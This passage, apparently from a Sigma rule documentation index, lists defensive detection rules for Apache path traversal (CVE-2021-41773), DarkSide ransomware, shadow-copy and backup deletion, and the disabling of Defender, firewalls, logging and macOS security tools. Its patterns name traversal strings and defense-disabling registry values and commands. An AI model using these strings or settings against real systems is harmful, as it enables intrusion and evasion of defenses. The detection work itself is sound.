https://nvd.nist.gov/vuln/detail/CVE-2021-41773 https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782 https://twitter.com/ptswarm/status/1445376079548624899 https://twitter.com/h4x0r_dz/status/1445401960371429381 https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml https://twitter.com/bl4sty/status/1445462677824761878 Raw rule (edit) title: CVE-2021-41773 Exploitation Attempt id: 3007fec6-e761-4319-91af-e32e20ac43f5 status: experimental description: Detects exploitation of flaw in path normalization in Apache HTTP server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \u0026#34;require all denied\u0026#34; these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. author: daffainfo, Florian Roth date: 2021/10/05 modified: 2021/10/06 references: - https://nvd.nist.gov/vuln/detail/CVE-2021-41773 - https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782 - https://twitter.com/ptswarm/status/1445376079548624899 - https://twitter.com/h4x0r_dz/status/1445401960371429381 - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml - https://twitter.com/bl4sty/status/1445462677824761878 logsource: category: webserver detection: selection: c-uri|contains: - \u0026#39;/cgi-bin/.%2e/\u0026#39; - \u0026#39;/icons/.%2e/\u0026#39; - \u0026#39;/cgi-bin/.%%32%65/\u0026#39; - \u0026#39;/icons/.%%32%65/\u0026#39; - \u0026#39;/cgi-bin/.%%%25%33\u0026#39; - \u0026#39;/icons/.%%%25%33\u0026#39; selection_success: sc-status: - 200 - 301 condition: selection and selection_success falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_41773_apache_path_traversal.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2021-41773 Exploitation Attempt"},{"categories":null,"contents":"Detects DarkSide Ransomware and helpers\nKnown false-positives Unknown UAC bypass method used by other malware References https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html https://app.any.run/tasks/8b9a571b-bcc1-4783-ba32-df4ba623b9c0/ https://www.joesandbox.com/analysis/411752/0/html#7048BB9A06B8F2DD9D24C77F389D7B2B58D2 Raw rule (edit) title: DarkSide Ransomware Pattern id: 965fff6c-1d7e-4e25-91fd-cdccd75f7d2c author: Florian Roth date: 2021/05/14 description: Detects DarkSide Ransomware and helpers status: experimental references: - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html - https://app.any.run/tasks/8b9a571b-bcc1-4783-ba32-df4ba623b9c0/ - https://www.joesandbox.com/analysis/411752/0/html#7048BB9A06B8F2DD9D24C77F389D7B2B58D2 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;=[char][byte](\u0026#39;\u0026#39;0x\u0026#39;\u0026#39;+\u0026#39; - \u0026#39; -work worker0 -path \u0026#39; selection2: ParentCommandLine|contains: \u0026#39;DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u0026#39; Image|contains: \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; condition: 1 of selection* falsepositives: - Unknown - UAC bypass method used by other malware level: critical tags: - attack.execution - attack.t1204 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mal_darkside_ransomware.yml/","tags":["attack.execution","attack.t1204"],"title":"DarkSide Ransomware Pattern"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization.\nKnown false-positives References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Data Exfiltration to Unsanctioned Apps id: 2b669496-d215-47d8-bd9a-f4a45bf07cda status: experimental description: Detects when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization. author: Austin Songer @austinsonger date: 2021/08/23 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Data exfiltration to unsanctioned apps\u0026#39; status: success condition: selection falsepositives: - level: medium tags: - attack.exfiltration - attack.t1537 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_data_exfiltration_to_unsanctioned_app.yml/","tags":["attack.exfiltration","attack.t1537"],"title":"Data Exfiltration to Unsanctioned Apps"},{"categories":null,"contents":"Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.\nKnown false-positives Domain Controllers acting as printer servers too? :) References https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 https://dirkjanm.io/a-different-way-of-abusing-zerologon/ https://twitter.com/_dirkjan/status/1309214379003588608 Raw rule (edit) title: DCERPC SMB Spoolss Named Pipe id: 214e8f95-100a-4e04-bb31-ef6cba8ce07e status: test description: Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled. author: OTR (Open Threat Research) references: - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 - https://dirkjanm.io/a-different-way-of-abusing-zerologon/ - https://twitter.com/_dirkjan/status/1309214379003588608 date: 2018/11/28 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName: \\\\\\*\\IPC$ RelativeTargetName: spoolss condition: selection falsepositives: - \u0026#39;Domain Controllers acting as printer servers too? :)\u0026#39; level: medium tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_dce_rpc_smb_spoolss_named_pipe.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"DCERPC SMB Spoolss Named Pipe"},{"categories":null,"contents":"Detects usage of base64 utility to decode arbitrary base64-encoded text\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md Raw rule (edit) title: Decode Base64 Encoded Text id: 719c22d7-c11a-4f2c-93a6-2cfdd5412f68 status: test description: Detects usage of base64 utility to decode arbitrary base64-encoded text author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: base64_execution: Image: \u0026#39;/usr/bin/base64\u0026#39; CommandLine|contains: \u0026#39;-d\u0026#39; condition: base64_execution falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_base64_decode.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"Decode Base64 Encoded Text"},{"categories":null,"contents":"Detects usage of base64 utility to decode arbitrary base64-encoded text\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md Raw rule (edit) title: Decode Base64 Encoded Text id: e2072cab-8c9a-459b-b63c-40ae79e27031 status: test description: Detects usage of base64 utility to decode arbitrary base64-encoded text author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: base64_execution: Image|endswith: \u0026#39;/base64\u0026#39; CommandLine|contains: \u0026#39;-d\u0026#39; condition: base64_execution falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_base64_decode.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"Decode Base64 Encoded Text"},{"categories":null,"contents":"Shadow Copies deletion using operating systems utilities via PowerShell\nKnown false-positives Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods Raw rule (edit) title: Delete Volume Shadow Copies Via WMI With PowerShell id: 87df9ee1-5416-453a-8a08-e8d4a51e9ce1 description: Shadow Copies deletion using operating systems utilities via PowerShell references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml - https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods tags: - attack.impact - attack.t1490 status: stable author: frack113 date: 2021/06/03 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection_obj: HostApplication|contains|all: - \u0026#39;Get-WmiObject\u0026#39; - \u0026#39; Win32_Shadowcopy\u0026#39; selection_del: HostApplication|contains: - \u0026#39;Delete()\u0026#39; - \u0026#39;Remove-WmiObject\u0026#39; condition: selection_obj and selection_del fields: - HostApplication falsepositives: - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_delete_volume_shadow_copies.yml/","tags":["attack.impact","attack.t1490"],"title":"Delete Volume Shadow Copies Via WMI With PowerShell"},{"categories":null,"contents":"Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.\nKnown false-positives Legitime usage References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-6---windows---delete-backup-files Raw rule (edit) title: Deletes Backup Files id: 06125661-3814-4e03-bfa2-1e4411c60ac3 status: experimental description: Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-6---windows---delete-backup-files date: 2022/01/02 logsource: product: windows category: file_delete detection: selection: Image|endswith: cmd.exe TargetFilename|endswith: - \u0026#39;.VHD\u0026#39; - \u0026#39;.bac\u0026#39; - \u0026#39;.bak\u0026#39; - \u0026#39;.wbcat\u0026#39; - \u0026#39;.bkf\u0026#39; - \u0026#39;.set\u0026#39; - \u0026#39;.win\u0026#39; - \u0026#39;.dsk\u0026#39; condition: selection falsepositives: - Legitime usage level: medium tags: - attack.impact - attack.t1490 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_delete/file_delete_win_delete_backup_file.yml/","tags":["attack.impact","attack.t1490"],"title":"Deletes Backup Files"},{"categories":null,"contents":"Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.\nKnown false-positives This may have false positives on hosts where Virtualbox is legitimately being used for operations References https://attack.mitre.org/techniques/T1564/006/ https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/ https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/ Raw rule (edit) title: Detect Virtualbox Driver Installation OR Starting Of VMs id: bab049ca-7471-4828-9024-38279a4c04da status: experimental description: Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM. references: - https://attack.mitre.org/techniques/T1564/006/ - https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/ - https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/ author: Janantha Marasinghe date: 2020/09/26 modified: 2021/06/27 tags: - attack.defense_evasion - attack.t1564.006 - attack.t1564 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: - \u0026#39;VBoxRT.dll,RTR3Init\u0026#39; - \u0026#39;VBoxC.dll\u0026#39; - \u0026#39;VBoxDrv.sys\u0026#39; selection_2: CommandLine|contains: - \u0026#39;startvm\u0026#39; - \u0026#39;controlvm\u0026#39; condition: selection_1 or selection_2 fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - This may have false positives on hosts where Virtualbox is legitimately being used for operations level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_run_virtualbox.yml/","tags":["attack.defense_evasion","attack.t1564.006","attack.t1564"],"title":"Detect Virtualbox Driver Installation OR Starting Of VMs"},{"categories":null,"contents":"Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md https://github.com/harleyQu1nn/AggressorScripts Raw rule (edit) title: Detected Windows Software Discovery id: 2650dd1a-eb2a-412d-ac36-83f06c4f2282 description: Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable. status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/16 modified: 2021/11/12 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md - https://github.com/harleyQu1nn/AggressorScripts #AVQuery.cna tags: - attack.discovery - attack.t1518 logsource: product: windows category: ps_script definition: \u0026#39;Script block logging must be enabled\u0026#39; detection: selection: ScriptBlockText|contains|all: # Example: Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize - \u0026#39;get-itemProperty\u0026#39; - \u0026#39;\\software\\\u0026#39; - \u0026#39;select-object\u0026#39; - \u0026#39;format-table\u0026#39; condition: selection level: medium falsepositives: - Legitimate administration activities ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_software_discovery.yml/","tags":["attack.discovery","attack.t1518"],"title":"Detected Windows Software Discovery"},{"categories":null,"contents":"HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.HxTsr.exe is part of Outlook apps, because it resides in a hidden \u0026ldquo;WindowsApps\u0026rdquo; subfolder of \u0026ldquo;C:\\Program Files\u0026rdquo;. Its path includes a version number, e.g., \u0026ldquo;C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_17.7466.41167.0_x64__8wekyb3d8bbwe\\HxTsr.exe\u0026rdquo;. Any instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe\nKnown false-positives unknown Raw rule (edit) title: Detecting Fake Instances Of Hxtsr.exe id: 4e762605-34a8-406d-b72e-c1a089313320 status: experimental description: HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.HxTsr.exe is part of Outlook apps, because it resides in a hidden \u0026#34;WindowsApps\u0026#34; subfolder of \u0026#34;C:\\Program Files\u0026#34;. Its path includes a version number, e.g., \u0026#34;C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_17.7466.41167.0_x64__8wekyb3d8bbwe\\HxTsr.exe\u0026#34;. Any instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe author: Sreeman date: 2020/04/17 modified: 2022/03/06 logsource: product: windows category: process_creation detection: selection: Image: hxtsr.exe filter: CurrentDirectory|startswith: \u0026#39;C:\\program files\\windowsapps\\microsoft.windowscommunicationsapps_\u0026#39; CurrentDirectory|endswith: \u0026#39;\\hxtsr.exe\u0026#39; condition: selection and not filter falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1036 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_detecting_fake_instances_of_hxtsr.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Detecting Fake Instances Of Hxtsr.exe"},{"categories":null,"contents":"This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nKnown false-positives Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action. References https://docs.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15 https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/ https://twitter.com/bryon_/status/975835709587075072 Raw rule (edit) title: Detection of PowerShell Execution via Sqlps.exe id: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3 status: test description: This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs. author: \u0026#39;Agro (@agro_sev) oscd.community\u0026#39; references: - https://docs.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15 - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/ - https://twitter.com/bryon_/status/975835709587075072 date: 2020/10/10 modified: 2022/02/25 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\sqlps.exe\u0026#39; selection_2: ParentImage|endswith: \u0026#39;\\sqlps.exe\u0026#39; selection_3: OriginalFileName: \u0026#39;\\sqlps.exe\u0026#39; filter: ParentImage|endswith: \u0026#39;\\sqlagent.exe\u0026#39; condition: 1 of selection_* and not filter falsepositives: - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action. level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1127 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_use_of_sqlps_bin.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1127"],"title":"Detection of PowerShell Execution via Sqlps.exe"},{"categories":null,"contents":"Detects access to DEWMODE webshell as described in FIREEYE report\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html Raw rule (edit) title: DEWMODE Webshell Access id: fdf96c90-42d5-4406-8a9c-14a2c9a016b5 status: experimental description: Detects access to DEWMODE webshell as described in FIREEYE report author: Florian Roth date: 2021/02/22 references: - https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html tags: - attack.persistence - attack.t1505.003 logsource: category: webserver detection: selection1: c-uri|contains|all: - \u0026#39;?dwn=\u0026#39; - \u0026#39;\u0026amp;fn=\u0026#39; - \u0026#39;.html?\u0026#39; selection2: c-uri|contains|all: - \u0026#39;\u0026amp;dwn=\u0026#39; - \u0026#39;?fn=\u0026#39; - \u0026#39;.html?\u0026#39; condition: 1 of selection* fields: - client_ip - response falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_unc2546_dewmode_php_webshell.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"DEWMODE Webshell Access"},{"categories":null,"contents":"Detects disabling Windows Defender Exploit Guard Network Protection\nKnown false-positives Unknown References https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html Raw rule (edit) title: Disable Exploit Guard Network Protection on Windows Defender id: bf9e1387-b040-4393-9851-1598f8ecfae9 description: Detects disabling Windows Defender Exploit Guard Network Protection status: experimental date: 2021/08/04 author: Austin Songer @austinsonger references: - https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html tags: - attack.defense_evasion - attack.t1562.001 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\DisallowExploitProtectionOverride\u0026#39; Details: \u0026#39;DWORD (00000001)\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disabled_exploit_guard_net_protection_on_ms_defender.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disable Exploit Guard Network Protection on Windows Defender"},{"categories":null,"contents":"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry Raw rule (edit) title: Disable Microsoft Defender Firewall via Registry id: 974515da-6cc5-4c95-ae65-f97f9150ec7f description: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage author: frack113 date: 2022/01/09 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry logsource: category: registry_event product: windows detection: selection: EventType: SetValue #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\EnableFirewall #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall #HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall TargetObject|startswith: HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\ TargetObject|endswith: \\EnableFirewall Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disable_defender_firewall.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Disable Microsoft Defender Firewall via Registry"},{"categories":null,"contents":"Disable Microsoft Office Security Features by registry\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/ https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/ Raw rule (edit) title: Disable Microsoft Office Security Features id: 7c637634-c95d-4bbf-b26c-a82510874b34 description: Disable Microsoft Office Security Features by registry status: experimental date: 2021/06/08 author: frack113 tags: - attack.defense_evasion - attack.t1562.001 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/ - https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/ logsource: product: windows category: registry_event definition: key must be add to the sysmon configuration to works # Sysmon # \u0026lt;TargetObject name=\u0026#34;T1562,office\u0026#34; condition=\u0026#34;end with\u0026#34;\u0026gt;\\VBAWarnings\u0026lt;/TargetObject\u0026gt; # \u0026lt;TargetObject name=\u0026#34;T1562,office\u0026#34; condition=\u0026#34;end with\u0026#34;\u0026gt;\\DisableInternetFilesInPV\u0026lt;/TargetObject\u0026gt; # \u0026lt;TargetObject name=\u0026#34;T1562,office\u0026#34; condition=\u0026#34;end with\u0026#34;\u0026gt;\\DisableUnsafeLocationsInPV\u0026lt;/TargetObject\u0026gt; # \u0026lt;TargetObject name=\u0026#34;T1562,office\u0026#34; condition=\u0026#34;end with\u0026#34;\u0026gt;\\DisableAttachementsInPV\u0026lt;/TargetObject\u0026gt; detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;\\SOFTWARE\\Microsoft\\Office\\\u0026#39; TargetObject|endswith: - VBAWarnings - DisableInternetFilesInPV - DisableUnsafeLocationsInPV - DisableAttachementsInPV Details: \u0026#39;DWORD (0x00000001)\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disable_microsoft_office_security_features.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disable Microsoft Office Security Features"},{"categories":null,"contents":"Detects command that is used to disable or delete Windows eventlog via logman Windows utility\nKnown false-positives Legitimate deactivation by administrative staff Installer tools that disable services, e.g. before log collection agent installation References https://twitter.com/0gtweet/status/1359039665232306183?s=21 https://ss64.com/nt/logman.html Raw rule (edit) title: Disable or Delete Windows Eventlog id: cd1f961e-0b96-436b-b7c6-38da4583ec00 status: experimental description: Detects command that is used to disable or delete Windows eventlog via logman Windows utility references: - https://twitter.com/0gtweet/status/1359039665232306183?s=21 - https://ss64.com/nt/logman.html tags: - attack.defense_evasion - attack.t1562.001 - attack.t1070.001 author: Florian Roth date: 2021/02/11 modified: 2021/12/02 logsource: category: process_creation product: windows detection: selection_tools: CommandLine|contains: - \u0026#39;logman \u0026#39; selection_action: CommandLine|contains: - \u0026#39;stop \u0026#39; - \u0026#39;delete \u0026#39; selection_service: CommandLine|contains: - EventLog-System condition: all of selection* falsepositives: - Legitimate deactivation by administrative staff - Installer tools that disable services, e.g. before log collection agent installation level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_disable_eventlog.yml/","tags":["attack.defense_evasion","attack.t1562.001","attack.t1070.001"],"title":"Disable or Delete Windows Eventlog"},{"categories":null,"contents":"Detects disabling Windows Defender PUA protection\nKnown false-positives Unknown References https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html Raw rule (edit) title: Disable PUA Protection on Windows Defender id: 8ffc5407-52e3-478f-9596-0a7371eafe13 description: Detects disabling Windows Defender PUA protection status: experimental date: 2021/08/04 author: Austin Songer @austinsonger references: - https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html tags: - attack.defense_evasion - attack.t1562.001 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\PUAProtection\u0026#39; Details: \u0026#39;DWORD (0x00000000)\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disabled_pua_protection_on_microsoft_defender.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disable PUA Protection on Windows Defender"},{"categories":null,"contents":"Detects disabling security tools\nKnown false-positives Legitimate activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Disable Security Tools id: ff39f1a6-84ac-476f-a1af-37fcdf53d7c0 status: test description: Detects disabling security tools author: Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: launchctl_unload: Image: \u0026#39;/bin/launchctl\u0026#39; CommandLine|contains: \u0026#39;unload\u0026#39; security_plists: CommandLine|contains: - \u0026#39;com.objective-see.lulu.plist\u0026#39; # Objective-See firewall management utility - \u0026#39;com.objective-see.blockblock.plist\u0026#39; # Objective-See persistence locations watcher/blocker - \u0026#39;com.google.santad.plist\u0026#39; # google santa - \u0026#39;com.carbonblack.defense.daemon.plist\u0026#39; # carbon black - \u0026#39;com.carbonblack.daemon.plist\u0026#39; # carbon black - \u0026#39;at.obdev.littlesnitchd.plist\u0026#39; # Objective Development Software firewall management utility - \u0026#39;com.tenablesecurity.nessusagent.plist\u0026#39; # Tenable Nessus - \u0026#39;com.opendns.osx.RoamingClientConfigUpdater.plist\u0026#39; # OpenDNS Umbrella - \u0026#39;com.crowdstrike.falcond.plist\u0026#39; # Crowdstrike Falcon - \u0026#39;com.crowdstrike.userdaemon.plist\u0026#39; # Crowdstrike Falcon - \u0026#39;osquery\u0026#39; # facebook osquery - \u0026#39;filebeat\u0026#39; # elastic log file shipper - \u0026#39;auditbeat\u0026#39; # elastic auditing agent/log shipper - \u0026#39;packetbeat\u0026#39; # elastic network logger/shipper - \u0026#39;td-agent\u0026#39; # fluentd log shipper disable_gatekeeper: Image: \u0026#39;/usr/sbin/spctl\u0026#39; CommandLine|contains: \u0026#39;disable\u0026#39; condition: (launchctl_unload and security_plists) or disable_gatekeeper falsepositives: - Legitimate activities level: medium tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_disable_security_tools.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disable Security Tools"},{"categories":null,"contents":"Detects disabling Windows Defender Tamper Protection\nKnown false-positives Unknown References https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html Raw rule (edit) title: Disable Tamper Protection on Windows Defender id: 93d298a1-d28f-47f1-a468-d971e7796679 description: Detects disabling Windows Defender Tamper Protection status: experimental date: 2021/08/04 author: Austin Songer @austinsonger references: - https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html tags: - attack.defense_evasion - attack.t1562.001 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection\u0026#39; Details: \u0026#39;DWORD (0)\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disabled_tamper_protection_on_microsoft_defender.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disable Tamper Protection on Windows Defender"},{"categories":null,"contents":"Disable User Account Conrol (UAC) by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 